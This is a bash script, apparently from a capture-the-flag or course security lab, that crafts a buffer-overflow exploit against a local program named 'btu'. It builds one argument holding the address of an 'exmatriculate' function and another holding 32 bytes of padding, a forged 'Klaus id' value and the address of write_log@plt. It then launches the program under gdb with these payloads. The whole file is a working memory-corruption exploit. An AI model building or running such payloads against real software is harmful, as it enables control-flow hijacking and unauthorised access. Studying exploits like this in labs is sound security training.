#!/bin/bash

# Generate second argument: address \x08\x04\xb1\xee (little endian of 0x0804b1ee address of exmatriculate)
ARG2=$(python3 -c 'import sys; sys.stdout.buffer.write(b"\xee\xb1\x04\x08")')

# Generate fourth argument: 32 "A"s + two crafted addresses
ARG4=$(python3 -c 'import sys; sys.stdout.buffer.write(
    b"A"*32 + 
    b"\xff\x1c\x45\x6a" +             # Klaus id
    b"\xcc\x1b\x05\x08"               # address of write_log@plt
)')

# Launch gdb with the program and arguments
gdb -q ./build/bin/btu --args ./build/bin/btu add lubna "$ARG2" 1234567891 "$ARG4"

